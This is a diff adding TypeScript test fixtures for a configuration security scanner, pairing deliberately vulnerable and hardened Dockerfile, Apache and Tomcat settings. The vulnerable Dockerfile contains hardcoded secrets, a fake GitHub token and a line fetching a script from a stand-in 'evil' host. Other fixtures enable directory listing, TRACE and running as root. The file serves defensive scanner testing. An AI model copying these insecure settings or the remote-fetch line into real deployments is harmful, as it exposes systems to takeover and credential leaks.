@@ -1,0 +1,119 @@
+import type { ScanRecord } from "../../src/lib/types";
+import { initialStages } from "../../src/lib/pipeline/orchestrator";
+
+// 데모용 취약/안전 레포를 그대로 테스트 픽스처로 재사용한다 (spec: prior art = fixture).
+export const VULN_TOKEN = "ghp_FAKE0123456789abcdefghijklmnopqrst";
+
+export const VULN_DOCKERFILE = [
+  "FROM ubuntu:latest",
+  "ENV API_KEY=supersecret123",
+  `ENV GITHUB_TOKEN=${VULN_TOKEN}`,
+  "EXPOSE 22 3306",
+  "ADD https://evil.example.com/x.sh /x.sh",
+  'CMD ["sleep", "300"]',
+].join("\n");
+
+export const SAFE_DOCKERFILE = [
+  "FROM debian:12.5",
+  "RUN useradd -r app",
+  "USER app",
+  "HEALTHCHECK CMD true",
+  "EXPOSE 8080",
+  'CMD ["sleep", "300"]',
+].join("\n");
+
+// Apache httpd 설정 픽스처 (Slice 5)
+export const VULN_APACHE = [
+  "User root",
+  '<Directory "/usr/local/apache2/htdocs">',
+  "  Options Indexes FollowSymLinks",
+  "</Directory>",
+  "TraceEnable On",
+].join("\n"); // CustomLog/ErrorDocument/ServerTokens Prod/ServerSignature Off 없음
+
+export const SAFE_APACHE = [
+  "User www-data",
+  "ServerTokens Prod",
+  "ServerSignature Off",
+  "TraceEnable Off",
+  "ErrorDocument 404 /404.html",
+  "CustomLog /var/log/apache2/access.log combined",
+  '<Directory "/usr/local/apache2/htdocs">',
+  "  Options -Indexes FollowSymLinks",
+  "  <LimitExcept GET POST>",
+  "    Require all denied",
+  "  </LimitExcept>",
+  "</Directory>",
+].join("\n");
+
+// Tomcat 설정 픽스처 (Slice 6). server.xml + web.xml을 이어붙인 형태(executor가 넘기는 형태와 동일).
+export const VULN_TOMCAT = [
+  '<Connector port="8080" protocol="HTTP/1.1" />', // server 속성 없음 → 기본 배너 노출 (W-26)
+  "<Host>",
+  '  <Valve className="org.apache.catalina.valves.RemoteIpValve" />', // AccessLogValve 없음 (W-08)
+  "</Host>",
+  "<web-app>",
+  "  <servlet>",
+  "    <servlet-name>default</servlet-name>",
+  "    <init-param>",
+  "      <param-name>listings</param-name>",
+  "      <param-value>true</param-value>", // W-01 fail
+  "    </init-param>",
+  "    <init-param>",
+  "      <param-name>readonly</param-name>",
+  "      <param-value>false</param-value>", // W-25 fail
+  "    </init-param>",
+  "  </servlet>",
+  "</web-app>", // <error-page> 없음 (W-09 fail)
+].join("\n");
+
+export const SAFE_TOMCAT = [
+  '<Connector port="8080" protocol="HTTP/1.1" server="WebServer" />', // W-26 pass
+  "<Host>",
+  '  <Valve className="org.apache.catalina.valves.AccessLogValve" directory="logs" />', // W-08 pass
+  "</Host>",
+  "<web-app>",
+  "  <servlet>",
+  "    <servlet-name>default</servlet-name>",
+  "    <init-param>",
+  "      <param-name>listings</param-name>",
+  "      <param-value>false</param-value>", // W-01 pass
+  "    </init-param>",
+  "    <init-param>",
+  "      <param-name>readonly</param-name>",
+  "      <param-value>true</param-value>", // W-25 pass
+  "    </init-param>",
+  "  </servlet>",
+  "  <error-page>", // W-09 pass
+  "    <error-code>404</error-code>",
+  "    <location>/404.html</location>",
+  "  </error-page>",
+  "</web-app>",
+].join("\n");
+
+export function makeScan(id: string, repoUrl = "https://example.com/repo.git", branch = "main"): ScanRecord {
+  const now = new Date().toISOString();
+  return {
+    id,
+    repoUrl,
+    branch,
+    createdAt: now,
+    updatedAt: now,
+    status: "running",
+    executor: "stub",
+    usedLocalImageFallback: false,
+    stages: initialStages(),
+    results: [],
+  };
+}
+
+// 인메모리 store: saveScan 호출 시점의 스냅샷을 보관한다.
+export function memStore() {
+  const saved = new Map<string, ScanRecord>();
+  return {
+    saveScan: async (s: ScanRecord) => {
+      saved.set(s.id, structuredClone(s));
+    },
+    get: (id: string) => saved.get(id),
+  };
+}
